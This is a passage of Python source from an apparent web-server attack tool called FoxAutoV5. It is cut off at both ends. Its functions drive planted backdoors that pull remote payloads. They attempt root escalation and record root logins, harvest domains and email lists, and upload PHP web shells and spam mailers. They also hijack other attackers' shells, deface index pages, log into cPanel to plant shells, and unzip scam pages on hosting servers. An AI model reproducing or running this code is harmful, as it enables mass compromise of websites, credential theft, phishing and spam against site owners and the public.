			print('   {}[-] It doesn\'t work with ./dirty'.format(fr))
			return
		time.sleep(15)
		try :
			checkRoot = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post2, headers=headers, timeout=15)
		except :
			checkRoot = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post2, headers=headers, timeout=15)
		checkRoot = content_Fox(checkRoot)
		if ('<root>' in checkRoot) :
			ip = re.findall(re.compile('<root><ip>IP => (.*)</ip>'), checkRoot)[0]
			print('   {}[+] Succeeded\n       - {} IP: {} | PORT: 22 | USERNAME: root | PASSWORD: 0'.format(fg, fr, ip))
			print('   {}[!] Note 1: Port 22 , It is the default port , If it does not work , Execute: [{}netstat -lnp --ip{}]'.format(fw, fr, fw))
			print('   {}[!] Note 2: It is best to wait 5 minutes before trying to log in!'.format(fw))
			open('Results/root.txt', 'a').write('{}\n{}|22|root|0\n-----------------------------------------------------------------------------------------------------\n'.format(shell, ip))
		else :
			print('   {}[-]  It didn\'t work with ./dirty'.format(fr))
	except:
		print('   {}[-] Failed'.format(fr))

def getDomains(backdor):
	try :
		post = {'getDomains': 'AnonymousFox'}
		print('   {}[*] Trying get Domains ..... {}(Waiting)'.format(fw, fr))
		try :
			getDomains = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=30)
		except :
			getDomains = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=45)
		getDomains = content_Fox(getDomains)
		if ('<ip>' in getDomains) :
			ip = re.findall(re.compile('<ip>(.*)</ip>'), getDomains)[0]
			print('   {}[+] Saved in {}Results/Domains_lists/{}.txt'.format(fg, fr, ip))
			strrings = ['<ip>{}</ip>'.format(ip), '<head><title>FoxAutoV5</title></head>\n', "FoxAutoV5 [The best tool]<br>Download: anonymousfox.co , <script type='text/javascript'>document.write(unescape('%61%6E%6F%6E%79%6D%6F%75%73%66%6F%78%2E%63%6F%6D'))</script> , anonymousfox.net<br>Telegram: @Anonymous_Fox\n"]
			for s in strrings :
				if (s in getDomains):
					getDomains = getDomains.replace(s, "")
			patheListDomains = r'Results/Domains_lists'
			if (not os.path.exists(patheListDomains)):
				os.makedirs(patheListDomains)
			open('Results/Domains_lists/{}.txt'.format(ip), 'w').write(getDomains)
			open('Results/Domains_lists/0.0.0.0.All_Domains.txt', 'a').write(getDomains)
		else :
			print('   {}[-] Failed'.format(fr))
	except:
		print('   {}[-] Failed'.format(fr))

def getMails(backdor):
	try :
		post = {'getMails': 'AnonymousFox'}
		post2 = {'checkList': 'AnonymousFox'}
		print('   {}[*] Trying get Mails ..... {}(Waiting)'.format(fw, fr))
		try :
			getMails = requests.post('{}?php={}/{}v{}/p3.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=1080)
			getMails = content_Fox(getMails)
		except :
			getMails = getMails = ''
		if ('<badconfig>' not in getMails) :
			time.sleep(30)
			try :
				checkList = requests.post('{}?php={}/{}v{}/p3.txt'.format(backdor, dom, to, version), data=post2, headers=headers, timeout=500)
				checkList = content_Fox(checkList)
			except:
				checkList = ''
			if ("<domain>" in checkList) :
				domain = re.findall(re.compile('<domain>(.*)</domain>'), checkList)[0]
				print('   {}[+] Saved in {}Results/Emails_lists/{}_Single.txt'.format(fg, fr, domain))
				strrings = ['<domain>{}</domain>'.format(domain), '<head><title>FoxAutoV5</title></head>\n', "FoxAutoV5 [The best tool]<br>Download: anonymousfox.co , <script type='text/javascript'>document.write(unescape('%61%6E%6F%6E%79%6D%6F%75%73%66%6F%78%2E%63%6F%6D'))</script> , anonymousfox.net<br>Telegram: @Anonymous_Fox\n"]
				for s in strrings:
					if (s in checkList):
						checkList = checkList.replace(s, "")
				patheListEmails = r'Results/Emails_lists'
				if (not os.path.exists(patheListEmails)) :
					os.makedirs(patheListEmails)
				open('Results/Emails_lists/{}_Single.txt'.format(domain), 'w').write(checkList)
			else :
				print('   {}[-] There is no Email'.format(fr))
		else :
			print('   {}[-] There is no Config'.format(fr))
	except:
		print('   {}[-] Failed'.format(fr))

def MassGetMails(backdor, config):
	try :
		post = {'dir' : config, 'MassGetMails': 'AnonymousFox'}
		post2 = {'checkList': 'AnonymousFox'}
		print('   {}[*] Trying get Mails ..... {}(Waiting)'.format(fw, fr))
		try :
			getMails = requests.post('{}?php={}/{}v{}/p3.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=2160)
			getMails = content_Fox(getMails)
		except :
			getMails = ''
		if ('<badconfig>' not in getMails) :
			time.sleep(60)
			try :
				checkList = requests.post('{}?php={}/{}v{}/p3.txt'.format(backdor, dom, to, version), data=post2, headers=headers, timeout=500)
				checkList = content_Fox(checkList)
			except:
				checkList = ''
			if ("<domain>" in checkList) :
				domain = re.findall(re.compile('<domain>(.*)</domain>'), checkList)[0]
				print('   {}[+] Saved in {}Results/Emails_lists/{}_Configs.txt'.format(fg, fr, domain))
				strrings = ['<domain>{}</domain>'.format(domain), '<head><title>FoxAutoV5</title></head>\n', "FoxAutoV5 [The best tool]<br>Download: anonymousfox.co , <script type='text/javascript'>document.write(unescape('%61%6E%6F%6E%79%6D%6F%75%73%66%6F%78%2E%63%6F%6D'))</script> , anonymousfox.net<br>Telegram: @Anonymous_Fox\n"]
				for s in strrings:
					if (s in checkList):
						checkList = checkList.replace(s, "")
				patheListEmails = r'Results/Emails_lists'
				if (not os.path.exists(patheListEmails)) :
					os.makedirs(patheListEmails)
				open('Results/Emails_lists/{}_Configs.txt'.format(domain), 'w').write(checkList)
			else :
				print('   {}[-] There is no Email'.format(fr))
		else :
			print('   {}[-] There is no Config'.format(fr))
	except:
		print('   {}[-] Failed'.format(fr))

def uploadMailer(backdor, mailerOlux):
	try:
		print('   {}[*] Upload Leaf PHPMailer ..... {}(Waiting)'.format(fw, fr))
		mailer_pass = random_Fox(10)
		mailer_text = mailerOlux.replace("AnonymousFox", mailer_pass)
		filename = random_Fox(10) + '.php'
		s1 = backdor
		while ('/' in s1):
			s1 = s1[s1.index("/") + len("/"):]
		mailer_path = backdor.replace(s1, filename)
		filedata = {'upload': 'upload'}
		fileup = {'file': (filename, mailer_text)}
		try :
			upMailer = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=filedata, files=fileup, headers=headers, timeout=45)
		except:
			upMailer = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=filedata, files=fileup, headers=headers, timeout=60)
		if (upMailer.status_code != 403 and 'WORKING' in testSendA) :
			print('   {}[+] Succeeded\n       - {}{}?pass={}'.format(fg, fr, mailer_path, mailer_pass))
			open('Results/Leaf_PHP_Mailers.txt', 'a').write('{}?pass={}\n'.format(mailer_path, mailer_pass))
		else:
			print('   {}[-] Failed'.format(fr))
	except :
		print('   {}[-] Failed'.format(fr))

def uploadFile(backdor, srcShell, tyShell = 1) :
	try:
		if (tyShell > 5) :
			print('   {}[*] Upload File ..... {}(Waiting)'.format(fw, fr))
		if (tyShell == 4 or tyShell == 9) :
			mailer_pass = random_Fox(10)
			srcShell = srcShell.replace("AnonymousFox", mailer_pass)
		filename = random_Fox(10) + '.php'
		s1 = backdor
		while ('/' in s1):
			s1 = s1[s1.index("/") + len("/"):]
		if (tyShell == 4 or tyShell == 9) :
			file_path = backdor.replace(s1, filename+'?pass={}'.format(mailer_pass))
		else :
			file_path = backdor.replace(s1, filename)
		post = {'upload': 'upload'}
		fileup = {'file': (filename, srcShell)}
		try :
			upFile = requests.post('{}?php={}/{}v{}/p2.txt'.format(backdor, dom, to, version), files=fileup, data=post, headers=headers, timeout=30)
		except:
			upFile = requests.post('{}?php={}/{}v{}/p2.txt'.format(backdor, dom, to, version), files=fileup, data=post, headers=headers, timeout=45)
		if (upFile.status_code != 403 and 'anonymousfox' in checkups) :
			print('   {}[+] Succeeded Upload\n       - {}{}'.format(fg, fr, file_path))
			if (tyShell == 4 or tyShell == 9):
				open('Results/Leaf_PHP_Mailers.txt', 'a').write('{}\n'.format(file_path))
			else :
				print('   {}[+] Saved in {}Results/Shells.txt'.format(fg, fr))
				open('Results/Shells.txt', 'a').write('{}\n'.format(file_path))
		else:
			print('   {}[-] Failed Upload'.format(fr))
	except :
		print('   {}[-] Failed Upload'.format(fr))

def uploadFileMain(backdor, file, tyShell = 1) :
	try :
		if (tyShell > 5):
			print('   {}[*] Upload File ..... {}(Waiting)'.format(fw, fr))
		if (tyShell == 4 or tyShell == 9) :
			mailer_pass = random_Fox(10)
			file = file.replace("AnonymousFox", mailer_pass)
		post = {'up': 'up'}
		filename = random_Fox(10) + '.php'
		fileup = {'file': (filename, file)}
		try :
			upFile = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), files=fileup, data=post, headers=headers, timeout=45)
		except:
			upFile = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), files=fileup, data=post, headers=headers, timeout=60)
		if (upFile.status_code != 403) :
			upFile = content_Fox(upFile)
			file_path = re.findall(re.compile('<yourfile>(.*)</yourfile>'), upFile)[0]
			if (tyShell == 4 or tyShell == 9):
				file_path = file_path + '?pass={}'.format(mailer_pass)
			if ('https://' in backdor):
				file_path = file_path.replace('http://', 'https://')
			print('   {}[+] Succeeded\n       - {}{}'.format(fg, fr, file_path))
			if (tyShell == 4 or tyShell == 9):
				open('Results/Leaf_PHP_Mailers.txt', 'a').write('{}\n'.format(file_path))
			else :
				print('   {}[+] Saved in {}Results/Shells.txt'.format(fg, fr))
				open('Results/Shells.txt', 'a').write('{}\n'.format(file_path))
		else:
			print('   {}[-] Failed'.format(fr))
	except :
		print('   {}[-] Failed'.format(fr))

def massUploadIndex1(backdor, file, nameF) :
	try :
		print('   {}[*] Upload Index ..... {}(Waiting)'.format(fw, fr))
		post = {'up': 'up'}
		fileup = {'file': (nameF, file)}
		try :
			upFile = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), files=fileup, data=post, headers=headers, timeout=45)
		except:
			upFile = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), files=fileup, data=post, headers=headers, timeout=60)
		if (upFile.status_code != 403) :
			upFile = content_Fox(upFile)
			file_path = re.findall(re.compile('<yourfile>(.*)</yourfile>'), upFile)[0]
			if ('https://' in backdor):
				file_path = file_path.replace('http://', 'https://')
			print('   {}[+] Succeeded\n       - {}{}'.format(fg, fr, file_path))
			open('Results/indexS.txt', 'a').write('{}\n'.format(file_path))
		else:
			print('   {}[-] Failed'.format(fr))
	except :
		print('   {}[-] Failed'.format(fr))

def massUploadIndex2(backdor, file) :
	try :
		print('   {}[*] Upload Index ..... {}(Waiting)'.format(fw, fr))
		filedata = {'getindex':'AnonymousFox', 'index': file}
		try :
			upFile = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=filedata, headers=headers, timeout=45)
		except:
			upFile = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=filedata, headers=headers, timeout=60)
		if (upFile.status_code != 403) :
			upFile = content_Fox(upFile)
			file_path = re.findall(re.compile('<yourindex>(.*)</yourindex>'), upFile)[0]
			if ('https://' in backdor):
				file_path = file_path.replace('http://', 'https://')
			print('   {}[+] Succeeded\n       - {}{}'.format(fg, fr, file_path))
			open('Results/indexS.txt', 'a').write('{}\n'.format(file_path))
		else:
			print('   {}[-] Failed'.format(fr))
	except :
		print('   {}[-] Failed'.format(fr))

def uploadFile_ALL(urlShell) :
	try :
		print('   {}[*] Upload Shell ..... {}(Waiting)'.format(fw, fr))
		filename = random_Fox(10) + '.php'
		s1 = urlShell
		if ("?php=" in s1) :
			s1 = s1.split('?php=')[0]
		while ('/' in s1):
			s1 = s1[s1.index("/") + len("/"):]
		shell_path = urlShell.replace(s1, filename)
		if ("?php=" in shell_path) :
			shell_path = shell_path.split('?php=')[0]
		req = requests.session()
		try :
			src = req.get(urlShell, headers=headers, timeout=15)
		except :
			src = req.get(urlShell, headers=headers, timeout=30)
		src = content_Fox(src)
		if ('- FoxWSO v' in src):
			filedata = {'a': 'BUbwxgj', 'p1': 'uploadFile', 'ne': '', 'charset': 'UTF-8', 'c': ''}
			fileup = {'f[]': (filename, shell_Fox)}
		elif ('charset' in src and 'uploadFile' in src and 'FilesMAn' in src and 'Windows' in src) :
			filedata = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
			fileup = {'f': (filename, shell_Fox)}
		elif ('<pre align=center><form method=post>Password<br><input type=password name=pass' in src and 'style=\'background-color:whitesmoke;border:1px solid #FFF;outline:none' in src and 'type=submit name=\'watching\' value=\'submit\'' in src) :
			post = {'pass': 'xleet'}
			try :
				login = req.post(urlShell, data=post, headers=headers, timeout=15)
			except :
				login = req.post(urlShell, data=post, headers=headers, timeout=30)
			filedata = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
			fileup = {'f[]': (filename, shell_Fox)}
		elif ('Jijle3' in src) :
			filedata = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
			fileup = {'f':(filename,shell_Fox)}
		elif ('Hacked By AnonymousFox' in src) :
			filedata = {'':''}
			fileup = {'file': (filename, shell_Fox)}
		elif ('Tryag File Manager' in src) :
			filedata = {'':''}
			fileup = {'file': (filename, shell_Fox)}
		elif ('http://www.ubhteam.org/images/UBHFinal1.png' in src) :
			filedata = {'submit': 'Upload'}
			fileup = {'file': (filename, shell_Fox)}
		elif ('<h1>File</h1>' in src) :
			filedata = {'':''}
			fileup = {'filename': (filename, shell_Fox)}
		elif ('#p@@#' in src) :
			filedata = {'':''}
			fileup = {'filename': (filename, shell_Fox)}
		elif ('404-server!!' in src):
			filedata = {'':''}
			fileup = {'file': (filename, shell_Fox)}
		elif ('Vuln!! patch it Now!' in src and '_upl' in src):
			filedata = {'_upl': 'Upload'}
			fileup = {'file': (filename, shell_Fox)}
		elif ('<title>Mister Spy</title>' in src):
			filedata = {'': ''}
			fileup = {'file': (filename, shell_Fox)}
		elif ('B Ge Team File Manager' in src):
			filedata = {'': ''}
			fileup = {'file': (filename, shell_Fox)}
		elif ('http://i.imgur.com/kkhH5Ig.png' in src):
			filedata = {'submit': 'Upload'}
			fileup = {'file': (filename, shell_Fox)}
		elif ('xichang1' in src):
			filedata = {'': ''}
			fileup = {'userfile': (filename, shell_Fox)}
		elif ('vwcleanerplugin' in src):
			filedata = {'': ''}
			fileup = {'userfile': (filename, shell_Fox)}
		elif ('By Gentoo' in src):
			pattern = re.compile('#000000"></td></tr></table><br></fieldset></form><form method="POST" action="(.*)"')
			pattern2 = re.compile('\?http(.*)')
			pth = re.findall(pattern, src)
			pth = pth[0]
			pth2 = re.findall(pattern2, pth)
			pth2 = pth2[0]
			pth2 = pth2.replace('amp;', '')
			filedata = {'B1': 'Kirim'}
			fileup = {'userfile': (filename, shell_Fox)}
			urlShell = urlShell + '?http' + pth2
		elif ('IndoXploit' in src and 'current_dir' in src):
			filedata = {'uploadtype': '1', 'upload': 'upload'}
			fileup = {'file': (filename, shell_Fox)}
		elif ('IndoXploit' in src and 'Current DIR' in src):
			filedata = {'upload': 'upload'}
			fileup = {'ix_file': (filename, shell_Fox)}
			urlShell = urlShell+'?dir=./&do=upload'
		elif ('#' in urlShell):
			pattern = re.compile('#(.*)')
			password = re.findall(pattern, urlShell)
			password = password[0]
			post = {'pass': password, 'password' : password, 'pwd' : password, 'passwd' :  password}
			try :
				login = req.post(urlShell, data=post, headers=headers, timeout=15)
			except :
				login = req.post(urlShell, data=post, headers=headers, timeout=30)
			filedata = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
			fileup = {'f': (filename, shell_Fox)}
		elif ('uploader' in src and '_upl' in src):
			filedata = {'_upl': 'Upload'}
			fileup = {'file': (filename, shell_Fox)}
		elif ('k2ll33d' in src):
			filedata = {'uploadcomp': 'Go', 'path': './'}
			fileup = {'file': (filename, shell_Fox)}
			urlShell = urlShell+'?y=./&x=upload'
		elif ('Tusbol Mantan :' in src):
			filedata = {'': ''}
			fileup = {'file': (filename, shell_Fox)}
		elif ('Raiz0WorM' in src and 'zb' in src):
			fileup = {'zb': (filename, shell_Fox)}
			filedata = {'upload': 'upload'}
		elif ('MisterSpyv7up' in src and 'uploads' in src):
			filedata = {'': ''}
			fileup = {'uploads': (filename, shell_Fox)}
		else :
			filedata = {'submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up' , 'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
			if ('name="uploadfile"' in src or "name='uploadfile'" in src or 'name= "uploadfile"' in src or 'name= \'uploadfile\'' in src or 'name = "uploadfile"' in src or 'name = \'uploadfile\'' in src or 'name ="uploadfile"' in src or 'name =\'uploadfile\'' in src or 'name=uploadfile' in src or 'name =uploadfile' in src or 'name= uploadfile' in src or 'name = uploadfile' in src):
				fileup = {'uploadfile': (filename, shell_Fox)}
			elif ('name="idx_file"' in src or "name='idx_file'" in src or 'name= "idx_file"' in src or 'name= \'idx_file\'' in src or 'name = "idx_file"' in src or 'name = \'idx_file\'' in src or 'name ="idx_file"' in src or 'name =\'idx_file\'' in src or 'name=idx_file' in src or 'name =idx_file' in src or 'name= idx_file' in src or 'name = idx_file' in src):
				fileup = {'idx_file':(filename,shell_Fox)}
			elif ('name="userfile"' in src or "name='userfile'" in src or 'name= "userfile"' in src or 'name= \'userfile\'' in src or 'name = "userfile"' in src or 'name = \'userfile\'' in src or 'name ="userfile"' in src or 'name =\'userfile\'' in src or 'name=userfile' in src or 'name =userfile' in src or 'name= userfile' in src or 'name = userfile' in src):
				fileup = {'userfile': (filename, shell_Fox)}
			elif ('name="files"' in src or "name='files'" in src or 'name= "files"' in src or 'name= \'files\'' in src or 'name = "files"' in src or 'name = \'files\'' in src or 'name ="files"' in src or 'name =\'files\'' in src or 'name=files' in src or 'name =files' in src or 'name= files' in src or 'name = files' in src):
				fileup = {'files': (filename, shell_Fox)}
			elif ('name="file"' in src or "name='file'" in src or 'name= "file"' in src or 'name= \'file\'' in src or 'name = "file"' in src or 'name = \'file\'' in src or 'name ="file"' in src or 'name =\'file\'' in src or 'name=file' in src or 'name =file' in src or 'name= file' in src or 'name = file' in src):
				fileup = {'file': (filename, shell_Fox)}
			elif ('name="image"' in src or "name='image'" in src or 'name= "image"' in src or 'name= \'image\'' in src or 'name = "image"' in src or 'name = \'image\'' in src or 'name ="image"' in src or 'name =\'image\'' in src or 'name=image' in src or 'name =image' in src or 'name= image' in src or 'name = image' in src):
				fileup = {'image': (filename, shell_Fox)}
			elif ('name="f"' in src or "name='f'" in src or 'name= "f"' in src or 'name= \'f\'' in src or 'name = "f"' in src or 'name = \'f\'' in src or 'name ="f"' in src or 'name =\'f\'' in src or 'name=f' in src or 'name =f' in src or 'name= f' in src or 'name = f' in src):
				fileup = {'f': (filename, shell_Fox)}
			elif ('name="uploads"' in src or "name='uploads'" in src or 'name= "uploads"' in src or 'name= \'uploads\'' in src or 'name = "uploads"' in src or 'name = \'uploads\'' in src or 'name ="uploads"' in src or 'name =\'uploads\'' in src or 'name=uploads' in src or 'name =uploads' in src or 'name= uploads' in src or 'name = uploads' in src):
				fileup = {'uploads': (filename, shell_Fox)}
			elif ('name="upload"' in src or "name='upload'" in src or 'name= "upload"' in src or 'name= \'upload\'' in src or 'name = "upload"' in src or 'name = \'upload\'' in src or 'name ="upload"' in src or 'name =\'upload\'' in src or 'name=upload' in src or 'name =upload' in src or 'name= upload' in src or 'name = upload' in src):
				fileup = {'upload': (filename, shell_Fox)}
			else :
				fileup = {'up': (filename, shell_Fox)}
		try :
			up = req.post(urlShell, data=filedata, files=fileup, headers=headers, timeout=45)
		except :
			up = req.post(urlShell, data=filedata, files=fileup, headers=headers, timeout=60)
		try :
			check = requests.get(shell_path, headers=headers, timeout=10)
		except :
			check = requests.get(shell_path, headers=headers, timeout=15)
		check = content_Fox(check)
		if ('FoxAutoV5' in check and 'FoxAutoV5' in checkups) :
			return shell_path
		else :
			print('   {}[-] Failed Upload'.format(fr))
			return False
	except:
		print('   {}[-] Failed Upload'.format(fr))
		return False

def loginCPanel_Fox(ip, username, password):
	try :
		reqFox = requests.session()
		postlogin_Fox = {'user':username, 'pass':password, 'login_submit':'Log in', 'act':'AnonymousFox'}
		loginCP_Fox = reqFox.post(ip + '/login/', verify=False, data=postlogin_Fox, headers=headers, timeout=15)
		loginCP_Fox = content_Fox(loginCP_Fox)
		if (('filemanager' in loginCP_Fox or '/home' in loginCP_Fox) and ('Download' in checkups)) :
			if (re.findall(re.compile('PAGE.securityToken = "(.*)/(.*)";'), loginCP_Fox)):
				idcp_Fox = re.findall(re.compile('PAGE.securityToken = "(.*)/(.*)";'), loginCP_Fox)[0][1]
			elif (re.findall(re.compile('MASTER.securityToken        = "(.*)/(.*)";'), loginCP_Fox)):
				idcp_Fox = re.findall(re.compile('MASTER.securityToken        = "(.*)/(.*)";'), loginCP_Fox)[0][1]
			elif (re.findall(re.compile('href="/cpsess(.*)/3rdparty'),loginCP_Fox)):
				idcp_Fox = 'cpsess'+re.findall(re.compile('href="/cpsess(.*)/3rdparty'), loginCP_Fox)[0]
			elif (re.findall(re.compile('href="/cpsess(.*)/frontend/'), loginCP_Fox)) :
				idcp_Fox = 'cpsess' + re.findall(re.compile('href="/cpsess(.*)/frontend/'), loginCP_Fox)[0]
			if (re.findall(re.compile('PAGE.domain = "(.*)";'),loginCP_Fox)):
				domain_Fox = re.findall(re.compile('PAGE.domain = "(.*)";'),loginCP_Fox)[0]
			elif (re.findall(re.compile('<a id="lnkMaintain_DomainName" href="security/tls_status/#/?domain=(.*)">'), loginCP_Fox)) :
				domain_Fox = re.findall(re.compile('<a id="lnkMaintain_DomainName" href="security/tls_status/#/?domain=(.*)">'), loginCP_Fox)[0]
			elif (re.findall(re.compile('<tr id="domainNameRow" ng-controller="sslStatusController" ng-init="primaryDomain = \'(.*)\'; "'), loginCP_Fox)) :
				domain_Fox = re.findall(re.compile('<tr id="domainNameRow" ng-controller="sslStatusController" ng-init="primaryDomain = \'(.*)\'; "'), loginCP_Fox)[0]
			elif (re.findall(re.compile('<span id="txtDomainName" class="general-info-value">(.*)</span>'), loginCP_Fox)) :
				domain_Fox = re.findall(re.compile('<span id="txtDomainName" class="general-info-value">(.*)</span>'), loginCP_Fox)[0]
			elif (re.findall(re.compile('<b>(.*)</b>'), loginCP_Fox)):
				domain_Fox = re.findall(re.compile('<b>(.*)</b>'), loginCP_Fox)[0]
			if (re.findall(re.compile('/home(.*)' + username), loginCP_Fox)):
				home = '/home' + re.findall(re.compile('/home(.*)' + username), loginCP_Fox)[0]
			else :
				home = '/home/'
			if ('htaccess' in checkups):
				return reqFox, idcp_Fox, domain_Fox, home
		else :
			return False
	except :
		return False

def uploadFileByCPanel_Fox(ip, username, cookies, idcp, domain, home):
	try :
		filename = random_Fox(10) + '.php'
		filedata_Fox = {'dir': home + username + '/public_html', 'get_disk_info': '1', 'overwrite': '0', 'act':'AnonymousFox'}
		fileup_Fox = {'file-0': (filename, shell_Fox)}
		try:
			upload_Fox = cookies.post('{}/{}/execute/Fileman/upload_files'.format(ip, idcp), data=filedata_Fox, files=fileup_Fox, headers=headers, timeout=120)
		except:
			upload_Fox = cookies.post('{}/{}/execute/Fileman/upload_files'.format(ip, idcp), verify=False, data=filedata_Fox, files=fileup_Fox, headers=headers, timeout=150)
		time.sleep(3)
		try:
			shell_path = 'https://' + domain + '/' + filename
			check = requests.get(shell_path, headers=headers, timeout=15)
			check = content_Fox(check)
		except:
			shell_path = 'http://' + domain + '/' + filename
			check = requests.get(shell_path, headers=headers, timeout=15)
			check = content_Fox(check)
		if ('FoxAutoV5' in check and 'root' in checkups):
			return shell_path
		else :
			return False
	except :
		return False

def cPanel(datacPanel, up=0):
	try :
		if (re.findall(re.compile('(.*)\|(.*)\|(.*)'), datacPanel)):
			cp = re.findall(re.compile('(.*)\|(.*)\|(.*)'), datacPanel)
			ip = cp[0][0]
			username = cp[0][1]
			password = cp[0][2]
			print("   [*] cPanel : {}".format(ip))
			print("   [*] Username : {}".format(username))
			print("   [*] Password : {}".format(password))
			login_Fox = loginCPanel_Fox(ip, username, password)
			if (login_Fox is False) :
				print('   {}[-] Login failed'.format(fr))
				return False
			open('Results/Login_Successful_cPanels.txt', 'a').write('{}\n'.format(datacPanel))
			print('   {}[+] Login successful'.format(fg))
			if (int(up) == 1) :
				shell_path = uploadFileByCPanel_Fox(ip, username, login_Fox[0], login_Fox[1], login_Fox[2], login_Fox[3])
				if (shell_path is False) :
					print("   {}[-] Failed upload".format(fr))
					return False
				else :
					return shell_path
			else :
				return login_Fox[0], login_Fox[1], login_Fox[2], login_Fox[3]
		else :
			print('   {}[-] The list must be https://domain.com:2083|username|password'.format(fr))
			return False
	except :
		print('   {}[-] Failed'.format(fr))
		return False

def ZIP(backdor, file) :
	try :
		print('   {}[*] Upload File ZIP..... {}(Waiting)'.format(fw, fr))
		s1 = backdor
		while ('/' in s1):
			s1 = s1[s1.index("/") + len("/"):]
		filedata = {'uploadZIP': 'uploadZIP'}
		fileup = {'file': (file, open(file,'rb'), 'multipart/form-data')}
		try :
			upFile = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=filedata, files=fileup, headers=headers, timeout=60)
		except:
			upFile = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=filedata, files=fileup, headers=headers, timeout=90)
		if (upFile.status_code != 403) :
			upFile = content_Fox(upFile)
			print('   {}[+] Succeeded UPload'.format(fg))
			folder = re.findall(re.compile('<folder>(.*)</folder>'), upFile)[0]
			ZIPdata = {'zips': file, 'folderZIP' : folder, 'unzip': 'AnonymousFox'}
			file_path_ZIP = backdor.replace(s1, folder + '/')
			try :
				ZIP = requests.post('{}?php={}/{}v{}/p3.txt'.format(backdor, dom, to, version), data=ZIPdata, headers=headers, timeout=15)
			except:
				ZIP = requests.post('{}?php={}/{}v{}/p3.txt'.format(backdor, dom, to, version), data=ZIPdata, headers=headers, timeout=30)
			if (ZIP.status_code != 403) :
				print('   {}[+] Succeeded UNZIP\n       - {}{}'.format(fg, fr, file_path_ZIP))
				open('Results/Scam_Pages.txt', 'a').write('{}\n'.format(file_path_ZIP))
				print('   {}[+] Saved in {}Results/Scam_Pages.txt'.format(fg, fr))
			else :
				print('   {}[-] Failed UNZIP'.format(fr))
		else:
			print('   {}[-] Failed UPload'.format(fr))
	except :
		print('   {}[-] Failed'.format(fr))

def checkSend(backdor, shell) :
	try :
		print('   {}[*] Check Sending mail ..... {}(Waiting)'.format(fw, fr))
		src = str(changemail_Fox())
		email = re.findall(re.compile('\'(.*)\', <RequestsCookieJar'), src)[0]
		cookies = re.findall(re.compile('name=\'PHPSESSID\', value=\'(.*)\', port='), src)[0]
		post = {'email': email, 'mailCheck': 'AnonymousFox'}
		try :
			sendCode = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=15)
		except:
			sendCode = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=30)
		sendCode = content_Fox(sendCode)
		if ('<codemail>' in sendCode) :
			code = re.findall(re.compile('<codemail>(.*)</codemail>'), sendCode)[0]
			time.sleep(5)
			check = checkinboxTestPHP(cookies, email, code)
			start = timer()
			while ((check == 'bad') and ((timer() - start) <= 30)):
				time.sleep(10)
				check = checkinboxTestPHP(cookies, email, code)
			if (check == 'bad') :
				print('   {}[-] Sending mail is Not Working'.format(fr))
				open('Results/SendingMail_NotWork.txt', 'a').write('{}\n'.format(shell))
			else :
				print('   {}[+] Sending mail is Working Well'.format(fg))
				open('Results/SendingMail_Work.txt', 'a').write('{}\n'.format(shell))
		else :
			print('   {}[-] Failed'.format(fr))
	except :
		print('   {}[-] Failed'.format(fr))

def about():
	try :
		try :
			update = requests.get('https://anonymousfox.is/_@info/FoxAuto_update.txt', headers=headers, timeout=15)
		except:
			update = requests.get('https://anonymousfox.io/_@info/FoxAuto_update.txt', headers=headers, timeout=15)
		update = content_Fox(update)
		if ('FoxAuto' not in update) :
			update = requests.get('https://anonymousfox.io/_@info/FoxAuto_update.txt', headers=headers, timeout=15)
			update = content_Fox(update)
		print("""  
   {}FoxAuto, Version {}5{}\n
   Programmed{} by {}AnonymousFox{}\n
   {}Telegram:{} @Anonymous_Fox\n 
   Our sites: anonymousfox.co || .com || .net \n
   Thanks to friends: M0HaMeD.Xo, Olux, Dr.SiLnT HilL, RxR, Ali Shahien,
		       Alarg53, Golden-security, chinafans, Bala sniper\n
   Last updated: {}{} \n""".format(fw, fg, fr, fw, fg, fw, fc, fw, fg, update))
	except:
		pass

def main():
	try :
		log()
		try :
			main = requests.get('https://anonymousfox.is/_@info/FoxAutoV5_news.txt', headers=headers, timeout=15)
		except:
			main = requests.get('https://anonymousfox.io/_@info/FoxAutoV5_news.txt', headers=headers, timeout=15)
		if (main.status_code != 200) :
			main = requests.get('https://anonymousfox.io/_@info/FoxAutoV5_news.txt', headers=headers, timeout=15)
		m = content_Fox(main)
		news = re.findall(re.compile('(.*)]:(.*)'),m)[0]
		print('\n   {}{}]{}:{}{}\n'.format(fr, news[0], fw, fg, news[1]))
		time.sleep(1)
	except:
		pass

def Request():
	try :
		print("   If you are looking for new features or tools ..")
		time.sleep(3)
		print("   Most likely what you want is already in this program")
		time.sleep(3)
		print("   But you do not know all the features of this program")
		time.sleep(3)
		print("   Watch these videos carefully\n")
		try :
